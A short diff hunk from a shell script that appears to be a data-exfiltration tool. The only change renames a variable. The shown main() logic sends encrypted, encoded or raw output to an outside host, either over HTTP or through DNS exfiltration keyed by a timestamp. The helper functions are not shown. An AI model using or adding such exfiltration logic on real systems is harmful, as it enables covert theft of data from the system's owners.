@@ -493,12 +493,12 @@ main() {
         fi
 
         if [ "$EXFIL" = true ]; then
-            local exfil_data="${encrypted_output:-${encoded_output:-$output}}"
+            local data_to_exfil="${encrypted_output:-${encoded_output:-$output}}"
             if [[ "$EXFIL_METHOD" == http://* ]]; then
-                exfil_http "$exfil_data" "$EXFIL_METHOD"
+                exfil_http "$data_to_exfil" "$EXFIL_METHOD"
             elif [[ "$EXFIL_METHOD" == dns=* ]]; then
                 local domain="${EXFIL_METHOD#dns=}"
-                exfil_dns "$exfil_data" "$domain" "$(date +%s)"
+                exfil_dns "$data_to_exfil" "$domain" "$(date +%s)"
             fi
         fi
     else
